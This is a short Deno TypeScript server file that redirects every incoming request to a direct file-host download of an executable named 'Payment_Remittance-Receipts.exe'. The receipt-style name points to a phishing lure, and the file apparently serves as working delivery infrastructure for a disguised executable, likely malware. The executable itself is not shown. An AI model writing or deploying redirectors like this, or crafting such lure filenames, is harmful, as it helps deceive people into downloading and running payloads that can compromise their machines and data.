// redirect.ts
import { serve } from "https://deno.land/std@0.200.0/http/server.ts";

const DESTINATION_URL = Deno.env.get("DESTINATION_URL") || "https://cold4.gofile.io/download/direct/c8fb9e16-7775-4839-b560-c69f0ba41ac7/Payment_Remittance-Receipts.exe";

function handleRequest(req: Request): Response {
  return Response.redirect(DESTINATION_URL, 301);
}

serve(handleRequest, { port: 8000 });
